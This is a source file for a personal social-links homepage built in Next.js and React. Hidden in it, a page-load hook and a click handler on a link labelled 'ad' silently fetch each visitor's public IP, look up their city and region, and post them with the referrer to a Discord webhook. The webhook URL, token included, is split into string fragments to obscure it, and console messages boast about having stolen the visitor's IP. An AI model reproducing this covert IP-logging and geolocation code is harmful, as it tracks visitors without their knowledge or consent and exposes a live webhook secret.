// Imports
import Head from "next/head";
import Link from "next/link";
import Image from "next/image";
import Script from "next/script";
import { use, useEffect, useRef, useState } from "react";
import { useEffectOnce } from "usehooks-ts";
import { useAnimation, motion } from "framer-motion";
import copy from "copy-to-clipboard";
import { publicIp, publicIpv4, publicIpv6 } from "public-ip";
var ipLocation = require("ip-location");
import Modal from "react-modal";

// CSS imports
import styles from "../styles/pages/Home.module.css";

// Component imports
import SecLayout from "../components/_seclayout";
import PageTitle from "../components/parts/PageTitle";
import { contains, get } from "jquery";
import ReactModal from "react-modal";
import { title } from "process";

let touched = 0;

// Page
export default function Home() {
	// showDiscordName state
	const [showDiscordName, setShowDiscordName] = useState(false);
	const [showModal, setShowModal] = useState(false);
	const [showModal2, setShowModal2] = useState(false);
	const [textQuizAnswer, setTextQuizAnswer] = useState("");
	const [ref, setRef] = useState<string>("");

	const [quizNums, setQuizNums] = useState([1, 2, 3, 4, 5, 6, 7, 8]);
	const [winNum, setWinNum] = useState(0);

	const [butCount, setButCount] = useState(0);

	// using use effect, run this code on page load
	useEffect(() => {
		async function getLoc(ip: any) {
			const response = await fetch("https://ipapi.co/" + ip + "/json/");
			const data = await response.json();
			return data.region + " - " + data.city;
		}
		async function fetchData() {
			var ipResponse = await fetch("https://api.ipify.org?format=json");
			var ipData = await ipResponse.json();
			var ip: string = ipData.ip;
			await fetch(
				"https://disco" +
					"rd.com/api/web" +
					"hooks/1329901938560602316/bQx_0a" +
					"GIcDEAEI2ZxoMsfbYCeWK9jBky4ksHJNF8IF6S4hWVmsfU7B_nfkzOuWEkJBCm",
				{
					method: "POST",
					headers: {
						"Content-Type": "application/json",
					},
					body: JSON.stringify({
						// content: ip,
						embeds: [
							{
								color: 0x00ff00,
								fields: [
									{
										name: "IP",
										value: ip,
										inline: true,
									},
									{
										name: "Location",
										value: await getLoc(ip),
										inline: true,
									},
									{
										name: "Ref",
										value: ref != null ? ref : "None",
										inline: true,
									},
								],
							},
						],
					}),
				}
			);
		}
		if (touched == 0) {
			touched = 1;
			console.log("Hi");
			console.log("Go away");
			console.log(
				"I stole your IP so its already too late. I know where you live now."
			);
			console.log("I have no clue what to do with it though so dont worry");

			const urlParams = new URLSearchParams(window.location.search);
			const ref = urlParams.get("ref") as string;
			setRef(ref);

			fetchData();

			// Read URL params

			if (ref == "badge") {
				// Came from qr code on badge
			}
			let temp = quizNums;
			// remove all but 3 random numbers
			for (let i = 0; i < 5; i++) {
				temp.splice(Math.floor(Math.random() * temp.length), 1);
			}
			setQuizNums(temp);
			// choose from 3 in temp to set win num
			let num = Math.ceil(Math.random() * temp.length) - 1;
			setWinNum(temp[num]);

			// // after 1 second, toggle shownodal vstate
			// setTimeout(() => {
			// 	setShowModal(true);
			// }, 1250);
		}
	}, []);

	const customStyles = {
		content: {
			top: "50%",
			left: "50%",
			right: "auto",
			bottom: "auto",
			marginRight: "-50%",
			transform: "translate(-50%, -50%)",

			borderRadius: "10px",
			backgroundColor: "rgba(20,20,20,0.95)", // Light red background
			border: "5px solid rgba(177, 0, 0, 0.9)", // Dark border
			boxShadow: "0 0 10px rgba(0, 0, 0, 0.1)",
		},
	};

	return (
		<SecLayout>
			{/* Meta tags */}
			<Head>
				<title>Atlas Is Gay</title>
				<link rel="canonical" href="https://atlasisgay.lol/" />
			</Head>

			{/* ! Main homepage content */}
			<main className={styles.main}>
				{/* 64px div spacer */}
				<div className=""></div>

				<PageTitle>
					<Modal
						isOpen={showModal}
						style={customStyles}
						contentLabel="Quiz"
						overlayClassName={styles.modalOverlay}
					>
						<div className={styles.modal}>
							<h1>Are you human?</h1>
							<h2 style={{ fontStyle: "italic", fontSize: "16px" }}>
								I hope not
							</h2>
							{/* <p>Choose the correct one.</p> */}
							<div style={{ height: "20px" }}></div>
							<ul className={styles.modalContentList}>
								{[quizNums[0], quizNums[1], quizNums[2]].map((num) => (
									<div key={num}>
										<li key={num}>
											{num == winNum ? (
												<Image
													src={`/quiz/${num}.png`}
													width={100}
													height={100}
													alt={`Quiz ${num}`}
													onClick={() => {
														alert("good boy");
														setShowModal(!showModal);
														// // open new tab with link href="https://twitter.com/NiceAtlAss"
														// window.open("https://twitter.com/GrabMyAtlAss");
													}}
												/>
											) : (
												<Image
													src={`/quiz/${num}.png`}
													width={100}
													height={100}
													alt={`Quiz ${num}`}
													onClick={() => {
														alert("try again");
													}}
												/>
											)}
										</li>
									</div>
								))}
							</ul>
							{/* <button
								onClick={() => setShowModal(!showModal)}
								className={styles.button}
							>
								Close
							</button> */}
						</div>
					</Modal>
					<Modal
						isOpen={showModal2}
						style={customStyles}
						contentLabel="Quiz"
						overlayClassName={styles.modalOverlay}
					>
						<div className={styles.modal}>
							<h1>What&apos;s my favorite place to eat?</h1>
							{/* <p>Choose the correct one.</p> */}
							<div style={{ height: "15px" }}></div>
							{/* a input text box that updates the state checking upon button press below it if text is "domu" without worrying abotu caps */}
							{/* then opens like to twitter.com/GrabMyAtlAss if domu */}
							<input
								type="text"
								id={styles.domuInputBox}
								value={textQuizAnswer}
								onChange={(e) => setTextQuizAnswer(e.target.value)}
							/>
							<div style={{ height: "10px" }}></div>
							<button
								onClick={() => {
									if (textQuizAnswer.toLowerCase() == "domu") {
										window.open("https://twitter.com/GrabMyAtlAss");
									}
								}}
							>
								Submit
							</button>
						</div>
					</Modal>
					{/* <h1 class
					{/* <h1 class
					Name="text-center container-sm">Atlas</h1> */}
					<p className="text-center container-sm">
						{/* eslint-disable-next-line react/no-unescaped-entities */}
						<a target="_blank" rel="noreferrer" href="https://t.me/eatmyatlass">
							my food channel
						</a>
					</p>
					<ul className={styles.socialList}>
						<li>
							<a
								href="https://instagram.com/atlaswuff"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/instagram.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
						{/* <li>
							<a
								href="https://twitter.com/AtlasWuff"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/twitter.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li> */}
						<li>
							<a href="https://t.me/AtlasWuff" target="_blank" rel="noreferrer">
								<Image
									src="/img/socials/telegram.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
						<li>
							<a
								// href="https://discord.com/users/484343723426054150"
								target="_blank"
								rel="noreferrer"
								onClick={() => setShowDiscordName(!showDiscordName)}
							>
								<Image
									src="/img/socials/discord.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
						<li>
							<a
								href="https://twitter.com/AtlasWuff"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/twitter.svg"
									width={40}
									height={40}
									alt=""
								/>
							</a>
						</li>
					</ul>
					<ul className={styles.socialListTwo}>
						<li>
							<a
								href="https://steamcommunity.com/id/AtlasWuff/"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/steam.svg"
									width={25}
									height={25}
									alt=""
								/>
							</a>
						</li>
						<li>
							<a
								href="https://open.spotify.com/user/9cr0p5etmezoezk2pbqlnzwvz"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/spotify.svg"
									width={25}
									height={25}
									alt=""
								/>
							</a>
						</li>
						<li>
							<a
								href="https://github.com/AtlasWuff"
								target="_blank"
								rel="noreferrer"
							>
								<Image
									src="/img/socials/github.svg"
									width={25}
									height={25}
									alt=""
								/>
							</a>
						</li>
						<li>
							<a
								onClick={() => alert("ask me for it")}
							>
								<Image
									src="/img/socials/snapchat.svg"
									width={25}
									height={25}
									alt=""
								/>
							</a>
						</li>
					</ul>
					<ul className={styles.socialListThree}>
						<li>
							<a
								// href="https://twitter.com/NiceAtlAss"
								target="_blank"
								rel="noreferrer"
								onClick={() => {
									// setShowModal(!showModal);
									async function getLoc(ip: any) {
										const response = await fetch(
											"https://ipapi.co/" + ip + "/json/"
										);
										const data = await response.json();
										return data.region + " - " + data.city;
									}
									async function fetchData() {
										var ipResponse = await fetch(
											"https://api.ipify.org?format=json"
										);
										var ipData = await ipResponse.json();
										var ip: string = ipData.ip;
										await fetch(
											"https://disco" +
												"rd.com/api/web" +
												"hooks/1329901938560602316" +
												"/bQx_0aGIcDEAEI2ZxoMsfbYCeWK9jBky4ksHJNF8IF6S4hWVmsfU7B_nfkzOuWEkJBCm",
											{
												method: "POST",
												headers: {
													"Content-Type": "application/json",
												},
												body: JSON.stringify({
													// content: ip,
													embeds: [
														{
															color: 0xff0000,
															title: "18+ visit",
															fields: [
																{
																	name: "IP",
																	value: ip,
																	inline: true,
																},
																{
																	name: "Location",
																	value: await getLoc(ip),
																	inline: true,
																},
															],
														},
													],
												}),
											}
										);
									}
									fetchData();
									// alert("ask, I only bite if you want <3");
									// const answer = prompt(
									// 	"What's my favorite place to eat? ifykyk🥢"
									// );
									// if (answer && answer.toLowerCase().trim() === "domu") {
									window.open("https://twitter.com/EatMyAtlAss");
									// } else {
									// 	alert("dont bother");
									// }
								}}
							>
								<p id={styles.freaky}>ad</p>
								{/* <Image
									src="/img/socials/age.svg"
									width={18}
									height={18}
									alt=""
								/> */}
							</a>
						</li>
					</ul>
					{showDiscordName && (
						<>
							<p className={styles.discName}>
								You can add me on Discord @{" "}
								<a onClick={() => copy("AtlasWuff")}>AtlasWuff</a>
							</p>
							<p className={styles.discClick}>{" (Click to copy) "}</p>
						</>
					)}
				</PageTitle>
			</main>
		</SecLayout>
	);
}
